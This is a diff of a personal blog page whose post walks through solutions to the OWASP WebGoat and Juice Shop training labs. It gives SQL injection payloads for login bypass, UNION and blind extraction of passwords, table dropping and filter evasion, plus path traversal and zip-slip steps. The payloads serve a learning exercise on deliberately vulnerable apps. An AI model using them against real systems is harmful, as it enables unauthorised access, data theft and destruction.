@@ -8,7 +8,7 @@
       
       
       
-        <link rel="canonical" href="https://garysuyemoto.com/blog/2023/05/26/juice-and-goats/">
+        <link rel="canonical" href="https://garysuyemoto.com/blog/2023/05/26/web-and-goats-p1/">
       
       
       
@@ -23,7 +23,7 @@
     
     
       
-        <title>juice and goats - CyberInsecurities</title>
+        <title>web and goats part 1 - CyberInsecurities</title>
       
     
     
@@ -69,7 +69,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#juice-shops-and-web-goats" class="md-skip">
+        <a href="#web-goats-part-1" class="md-skip">
           Skip to content
         </a>
       
@@ -104,7 +104,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              juice and goats
+              web and goats part 1
             
           </span>
         </div>
@@ -372,6 +372,32 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../../category/broken-access-control/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    
+  
+    Broken Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../../../category/sql-injection/" class="md-nav__link">
         
   
@@ -452,17 +478,6 @@
       Table of contents
     </label>
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#scanning-the-juice-store" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Scanning the Juice Store
-      
-    </span>
-  </a>
-  
-</li>
       
         <li class="md-nav__item">
   <a href="#sql-injection" class="md-nav__link">
@@ -777,42 +792,33 @@
 
 
 
-<h1 id="juice-shops-and-web-goats">Juice shops and web goats</h1>
-<p>For those who don't know, the <a href="https://owasp.org/www-project-juice-shop/" target="_blank">OWASP Juice Shop</a> is a <del>handy</del> <strong>modern full stack web app</strong> with some of the top known vulnerabilities baked in, thus allowing you to get your web pen testing juices flowing (pun intended)!</p>
-<p>I set up a local Ubuntu VM and installed the Juice Shop manually using NodeJS and NPM.</p>
+<div><h1 id="web-goats-part-1">Web Goats Part 1</h1>
+<p>If you want to learn or practice your cybersecurity skills, especially against the top ten OWASP web vulnerabilities, then the <a href="https://owasp.org/www-project-webgoat/">OWASP WebGoat</a> is a great tool. Allowing for you to practice a range of different techniques that would be otherwise be time consuming to set up in a lab setting, such as fuzzing and SQL Injection, WebGoat also provides great insight and guidance.</p>
 <!-- more -->
 
 <div class="admonition info">
-<p class="admonition-title">Using NPM</p>
-<p>Go to the <a href="https://github.com/juice-shop/juice-shop#from-sources" target="_blank">Juice Shop Github</a> for the full installation instructions.
-Here is the what I did (need NodeJS &amp; NPM installed)
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/juice-shop/juice-shop.git<span class="w"> </span>--depth<span class="w"> </span><span class="m">1</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">cd</span><span class="w"> </span>juice-shop
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>npm<span class="w"> </span>install
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>npm<span class="w"> </span>start
-</span></code></pre></div></p>
+<p class="admonition-title">Get the WebGoat Distro</p>
+<p>Go to the <a href="https://github.com/WebGoat/WebGoat/releases" target="_blank">WebGoat Github</a> for the latest distro. Just download it and run it:
+</p><div class="language-java highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">webgoat</span><span class="p">.</span><span class="na">jar</span>
+</span></code></pre></div>
 </div>
-<p>After getting the Juice Shop server set up, I set up an additional VM with Kali Linux and then provided them both with only a single network interface, a local link, to talk to each other.</p>
+<p>Default server settings serve the WebGoat on localhost (127.0.0.1) on port 8080. Just open a browser and go to the URL:
+</p><div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>https://localhost:8080/WebGoat
+</span></code></pre></div>
 <div class="admonition warning">
 <p class="admonition-title">Warning</p>
-<p>It's not a good idea to set up the Juice Shop and provide access to the WWW to the server...</p>
+<p>It's not a good idea to set up WebGoat and provide it access to the WAN/internet and therefore OTHERS to access your WebGoat.</p>
 </div>
-<p>On the Kali box, I tried the following security scanning apps to get an general idea of possible exploits.</p>
-<h3 id="scanning-the-juice-store">Scanning the Juice Store</h3>
-<ul>
-<li><a href="https://wapiti-scanner.github.io/" target="_blank">Wapiti</a>: Found nothing</li>
-<li><a href="https://www.kali.org/tools/skipfish/" target="_blank">SkipFish</a>: Decent amount of hidden directories and more. Nice HTML report. Crashed web server. Found redirect flag for Juice Store.</li>
-<li><a href="https://portswigger.net/burp/communitydownload" target="_blank">BurpSuite</a>: Have to request a trial for 30 days (don't want to pay $500 for pro in order to scan). Still waiting on trial.</li>
-<li><a href="https://github.com/sullo/nikto" target="_blank">nikto</a>: Very heavy on the certificates found in various paths. Need to check if output a nicer report format. Found WordPress directories that others missed.</li>
-</ul>
+<p>Some of the lessons require some kind of proxy and the recommendation is for <a href="https://owasp.org/www-project-zap">OWASP ZAP</a> or <a href="https://portswigger.net/burp/communitydownload">BurpSuite</a>. In many case, I found that you could just use the browser's dev tools. I used all of the choices, ZAP, Burp and the dev tools. Burp requires that you get a trial license for scanning. ZAP was incredibly handy for fuzzing, albeit in many cases it was just brute force.</p>
+<p>OK. So, I skipped ahead in the lessons and went straight for the SQL Injection section...</p>
 <h3 id="sql-injection">SQL Injection</h3>
 <p>I find most information on the internet about SQL Injection sorely lacking. It's quite interesting to me that this same example for SQL Injection has been around for a very long time, if I'm not mistaken.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&#39; or 1=1;--
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>' or 1=1;--
 </span></code></pre></div>
 <p>Does this still work on a bunch of servers? I wonder.</p>
 <p>Anyways, on to the Juice Shop login page. Here I was able to log on as administrator with:</p>
 <p>User:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>administrator\&#39; or 1=1;--
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>administrator\' or 1=1;--
 </span></code></pre></div>
 <p>Pass: test</p>
 <p>Which logged me in and provided me with the real admin email: admin@juice-sh.op</p>
@@ -820,24 +826,24 @@ Here is the what I did (need NodeJS &amp; NPM installed)
 <p>WebGoat is one of the best free instructional units for various types of web vulnerabilities that I have come across. The entire app is packaged as a single .jar and is super simple to get running. There are 8 lessons broken down by the types of vulnerabilities you would see in the wild and many of the lessons have several sections each. WebGoat is great for learning!</p>
 <div class="admonition info">
 <p class="admonition-title">Download and installation instructions</p>
-<p><a href="https://owasp.org/www-project-webgoat/" target="_blanks">OWASP WebGoat</a> main page<br />
+<p><a href="https://owasp.org/www-project-webgoat/" target="_blanks">OWASP WebGoat</a> main page<br>
 You can find the latest .jar distribution files at the <a href="https://github.com/WebGoat/WebGoat/releases" target="_blank">WebGoat Github</a> page.</p>
 </div>
 <p>I also set up WebGoat on the same VM as the Juice Shop. A useful tip for anyone doing the same thing was that the documentation on the website was misleading as I wanted to change the default IP from localhost to 0.0.0.0. On the website it seems to imply that you can change the server address using the following command line argument:</p>
-<div class="language-java highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">webgoat</span><span class="o">-</span><span class="n">app</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="o">--</span><span class="n">server</span><span class="p">.</span><span class="na">address</span><span class="o">=</span><span class="mf">0.0.0.0</span>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">webgoat</span><span class="o">-</span><span class="n">app</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="o">--</span><span class="n">server</span><span class="p">.</span><span class="na">address</span><span class="o">=</span><span class="mf">0.0.0.0</span>
 </span></code></pre></div>
 <p>And this certainly did not work for me. I have a set up where I have 2 VMs on a local link where the WebGoat would be at 169.254.7.200 and my attacking machine (using Kali) would be at 169.254.7.150.</p>
 <p>This is what finally worked for me (which I gleaned from the <a href="https://github.com/WebGoat/WebGoat">github repo</a>):</p>
-<div class="language-java highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">Dserver</span><span class="p">.</span><span class="na">address</span><span class="o">=</span><span class="mf">0.0.0.0</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">webgoat</span><span class="o">-</span><span class="n">app</span><span class="p">.</span><span class="na">jar</span>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">Dserver</span><span class="p">.</span><span class="na">address</span><span class="o">=</span><span class="mf">0.0.0.0</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">webgoat</span><span class="o">-</span><span class="n">app</span><span class="p">.</span><span class="na">jar</span>
 </span></code></pre></div>
 <details class="info">
 <summary>FYI WebGoat uses HSQLDB</summary>
 <p>Some interesting functions for HSQLDB:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>char()
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>length()
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>substr()
+</p><div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>char()
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>length()
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>substr()
 </span></code></pre></div>
-More can be found in <a href="https://hsqldb.org/doc/2.0/guide/guide.html#sqlgeneral-chapt" target="_blank">the reference</a> and more specifically the <a href="https://hsqldb.org/doc/2.0/guide/guide.html#builtinfunctions-chapt">system functions</a>.</p>
+More can be found in <a href="https://hsqldb.org/doc/2.0/guide/guide.html#sqlgeneral-chapt" target="_blank">the reference</a> and more specifically the <a href="https://hsqldb.org/doc/2.0/guide/guide.html#builtinfunctions-chapt">system functions</a>.
 </details>
 <p>Some good tips picked up from the lessons in WebGoat:</p>
 <ul>
@@ -858,105 +864,105 @@ More can be found in <a href="https://hsqldb.org/doc/2.0/guide/guide.html#sqlgen
 <li>Types include: content-based and time-based injections</li>
 <li>Find out what type of DB as that can provide insight to available system tables</li>
 </ul>
-<div class="language-yaml highlight"><span class="filename">Content-based</span><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">https://shop.example.com/?article=4 and 1=1</span><span class="w"> </span><span class="c1"># (1)!</span>
+<div class="language-yaml highlight"><span class="filename">Content-based</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="w">    </span><span class="l l-Scalar l-Scalar-Plain">https://shop.example.com/?article=4 and 1=1</span><span class="w"> </span><span class="c1"># (1)!</span>
 </span></code></pre></div>
 <ol>
 <li>If no error is thrown, then this DB might be susceptible to SQL Injection</li>
 </ol>
-<div class="language-javascript highlight"><span class="filename">Time-based</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="w">    </span><span class="err">&#39;</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="mf">1</span><span class="o">=</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mf">10</span><span class="p">);</span><span class="o">--</span><span class="w"> </span><span class="c1">// (1)!</span>
+<div class="language-javascript highlight"><span class="filename">Time-based</span><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="w">    </span><span class="err">'</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="mf">1</span><span class="o">=</span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">sleep</span><span class="p">(</span><span class="mf">10</span><span class="p">);</span><span class="o">--</span><span class="w"> </span><span class="c1">// (1)!</span>
 </span></code></pre></div>
 <ol>
 <li>If there is 10 second delay then this DB might be susceptible</li>
 </ol>
-<hr />
+<hr>
 <h2 id="solutions-intro">Solutions Intro</h2>
-<hr />
+<hr>
 <h3 id="webgoat-sql-intro-solution-for-exercise-9">WebGoat SQL (Intro) - Solution for exercise 9:</h3>
 <p>A classic??</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&#39; or &#39;1&#39;=&#39;1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>' or '1'='1
 </span></code></pre></div>
 <h3 id="webgoat-sql-intro-solution-for-exercise-10">WebGoat SQL (Intro) - Solution for exercise 10:</h3>
-<p><div class="language-text highlight"><span class="filename">Login_Count:</span><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>1
+<p></p><div class="language-text highlight"><span class="filename">Login_Count:</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>1
 </span></code></pre></div>
-<div class="language-yaml highlight"><span class="filename">User_id:</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="l l-Scalar l-Scalar-Plain">1 or 1=1</span><span class="w"> </span><span class="c1"># (1)!</span>
-</span></code></pre></div></p>
+<div class="language-yaml highlight"><span class="filename">User_id:</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="l l-Scalar l-Scalar-Plain">1 or 1=1</span><span class="w"> </span><span class="c1"># (1)!</span>
+</span></code></pre></div>
 <ol>
 <li>These fields expect numbers and therefore no quotes are necessary.</li>
 </ol>
 <h3 id="webgoat-sql-intro-solution-for-exercise-11">WebGoat SQL (Intro) - Solution for exercise 11:</h3>
-<div class="language-text highlight"><span class="filename">Employee Name:</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>&#39; or 1=1;--
+<div class="language-text highlight"><span class="filename">Employee Name:</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>' or 1=1;--
 </span></code></pre></div>
 <p>or</p>
-<p><div class="language-text highlight"><span class="filename">Employee Name:</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Blah
+<p></p><div class="language-text highlight"><span class="filename">Employee Name:</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>Blah
 </span></code></pre></div>
-<div class="language-text highlight"><span class="filename">Authentication TAN:</span><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>&#39; or &#39;1&#39;=&#39;1
-</span></code></pre></div></p>
+<div class="language-text highlight"><span class="filename">Authentication TAN:</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>' or '1'='1
+</span></code></pre></div>
 <h3 id="webgoat-sql-intro-solution-for-exercise-12">WebGoat SQL (Intro) - Solution for exercise 12:</h3>
-<div class="language-text highlight"><span class="filename">Employee Name:</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>&#39; or 1=1; UPDATE employees SET salary=100000 WHERE first_name=&#39;John&#39;
+<div class="language-text highlight"><span class="filename">Employee Name:</span><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>' or 1=1; UPDATE employees SET salary=100000 WHERE first_name='John'
 </span></code></pre></div>
 <h3 id="webgoat-sql-intro-solution-for-exercise-13">WebGoat SQL (Intro) - Solution for exercise 13:</h3>
-<div class="language-text highlight"><span class="filename">Action contains:</span><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>&#39; or 1=1; DROP TABLE access_log;--
+<div class="language-text highlight"><span class="filename">Action contains:</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>' or 1=1; DROP TABLE access_log;--
 </span></code></pre></div>
-<hr />
+<hr>
 <h2 id="solutions-advanced-where-things-get-interesting">Solutions Advanced -- Where things get interesting</h2>
-<hr />
+<hr>
 <h3 id="webgoat-sql-advanced-solution-for-exercise-3">WebGoat SQL (Advanced) - Solution for exercise 3:</h3>
-<div class="language-text highlight"><span class="filename">Name:</span><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>Dave&#39; union select userid, user_name, &#39;name&#39;, &#39;cc&#39;, password, cookie, 1 from user_system_data;--
+<div class="language-text highlight"><span class="filename">Name:</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Dave' union select userid, user_name, 'name', 'cc', password, cookie, 1 from user_system_data;--
 </span></code></pre></div>
 <p>or</p>
-<div class="language-text highlight"><span class="filename">Name:</span><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Dave&#39;; select * from user_system_data;--
+<div class="language-text highlight"><span class="filename">Name:</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>Dave'; select * from user_system_data;--
 </span></code></pre></div>
 <h3 id="webgoat-sql-advanced-solution-for-exercise-5">WebGoat SQL (Advanced) - Solution for exercise 5:</h3>
 <p>This one involved blind SQL injection on a login page. After much trials on the login section with the username and pass, I moved on to the registration section and created a new user named 'devon.' After creating the user I then tried creating the same user with:</p>
-<div class="language-text highlight"><span class="filename">Username:</span><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>devon&#39; and 1=1;--
+<div class="language-text highlight"><span class="filename">Username:</span><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>devon' and 1=1;--
 </span></code></pre></div>
 <p>The response was that the user was already created, but this can't be true as the username includes the '1=1' and other special script. This shows that there is a user with this name, which we already knew and that the server used the remaining string as an injection that compared the user name AND 1=1 which returned a hit.</p>
 <p>Also, you can double check that injection is possible by using the reverse logic:</p>
-<div class="language-text highlight"><span class="filename">Username:</span><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>devon&#39; and 1=2;--
+<div class="language-text highlight"><span class="filename">Username:</span><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>devon' and 1=2;--
 </span></code></pre></div>
 <p>Using this entry, one can create the same user over and over without being warned that the user already exists. This again indicates that the server is using the injection. Devon exists so the left side of AND is TRUE and as 1=2 is FALSE, the boolean logic becomes:</p>
 <p>true AND false = false</p>
-<hr />
+<hr>
 <h2 id="solutions-mitigation">Solutions Mitigation</h2>
-<hr />
+<hr>
 <h3 id="webgoat-sql-mitigation-solution-for-exercise-9">WebGoat  SQL (Mitigation) - Solution for exercise 9:</h3>
 <p>Here the backend server is removing all spaces. In order to bypass this, we can use multiline comments to replace the spaces:</p>
-<div class="language-text highlight"><span class="filename">Replace spaces with comments</span><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>&#39;/*sp*/or/*sp*/&#39;1&#39;=&#39;1&#39;;select/*sp*/*/*sp*/from/*sp*/user_system_data;--
+<div class="language-text highlight"><span class="filename">Replace spaces with comments</span><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>'/*sp*/or/*sp*/'1'='1';select/*sp*/*/*sp*/from/*sp*/user_system_data;--
 </span></code></pre></div>
-<hr />
+<hr>
 <h2 id="solutions-path-traversal">Solutions Path Traversal</h2>
-<hr />
+<hr>
 <h3 id="webgoat-sql-path-traversal-solution-for-exercise-3">WebGoat  SQL (Path Traversal) - Solution for exercise 3:</h3>
 <p>Here the app is replacing occurrences of "../" to prevent "dot-dot-slash" or path traversal. In the following example, the middle is replaced by the app leaving the path traversal nonetheless:</p>
-<div class="language-text highlight"><span class="filename">Full Name:</span><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>....//test
+<div class="language-text highlight"><span class="filename">Full Name:</span><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>....//test
 </span></code></pre></div>
 <h3 id="webgoat-sql-path-traversal-solution-for-exercise-4">WebGoat  SQL (Path Traversal) - Solution for exercise 4:</h3>
 <ul>
 <li>Open <em>Manual Request Editor</em> using OWASP ZAP.   </li>
 <li>In the request body change:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>filename=&quot;../white-bookshelf.jpg&quot;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>filename="../white-bookshelf.jpg"
 </span></code></pre></div></li>
 </ul>
 <h3 id="webgoat-sql-path-traversal-solution-for-exercise-5">WebGoat  SQL (Path Traversal) - Solution for exercise 5:</h3>
 <p>Open OWASP ZAP and find the GET request that is being sent when the 'Show random cat picture' button is pressed. Modify this request and resend it using the <em>Manual Request Editor</em>. Found the location by first adding just <code>%2e%2e%2f</code> to the GET request and getting 404 error message with current directory. There is a URL encoding tool in ZAP.</p>
-<div class="language-text highlight"><span class="filename">GET Request</span><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>GET http://localhost:9000/WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret
+<div class="language-text highlight"><span class="filename">GET Request</span><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>GET http://localhost:9000/WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret
 </span></code></pre></div>
 <h3 id="webgoat-sql-path-traversal-solution-for-exercise-7">WebGoat  SQL (Path Traversal) - Solution for exercise 7:</h3>
-<div class="language-bash highlight"><span class="filename">Terminal</span><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">cd</span><span class="w"> </span>/tmp/webgoat125something
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>cp<span class="w"> </span>/location-of-some/pic.jpg<span class="w"> </span>/home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>zip<span class="w"> </span>goat.zip<span class="w"> </span>../../home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg
+<div class="language-bash highlight"><span class="filename">Terminal</span><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">cd</span><span class="w"> </span>/tmp/webgoat125something
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>cp<span class="w"> </span>/location-of-some/pic.jpg<span class="w"> </span>/home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>zip<span class="w"> </span>goat.zip<span class="w"> </span>../../home/user/.webgoat/PathTraversal/webgoat/webgoat.jpg
 </span></code></pre></div>
 <p>Then, upload the file via the WebGoat upload page.</p>
 <h3 id="interesting-sql-injection-queries-i-used-to-get-necessary-info-from-the-db">Interesting SQL Injection queries I used to get necessary info from the DB:</h3>
-<p><div class="language-text highlight"><span class="filename">Using EXISTS()</span><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>&#39; or EXISTS(SELECT * FROM users);
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>devon&#39; and exists(select * from users) and &#39;1&#39;=&#39;1
+<p></p><div class="language-text highlight"><span class="filename">Using EXISTS()</span><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>' or EXISTS(SELECT * FROM users);
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>devon' and exists(select * from users) and '1'='1
 </span></code></pre></div>
-<div class="language-text highlight"><span class="filename">Using Binary Search</span><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>Tom&#39; and length(password)&gt;0;--
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>tom&#39; AND ascii(substring(password,1,1)) &gt; 60;--
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>Tom&#39; and length(user)&gt;5;--
-</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>Tom&#39; and ascii(substr(user,2,2))=65;--
-</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>Tom&#39; and right(email,3)=&#39;com
-</span></code></pre></div></p>
+<div class="language-text highlight"><span class="filename">Using Binary Search</span><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>Tom' and length(password)&gt;0;--
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>tom' AND ascii(substring(password,1,1)) &gt; 60;--
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>Tom' and length(user)&gt;5;--
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>Tom' and ascii(substr(user,2,2))=65;--
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>Tom' and right(email,3)='com
+</span></code></pre></div></div>
 
   
   
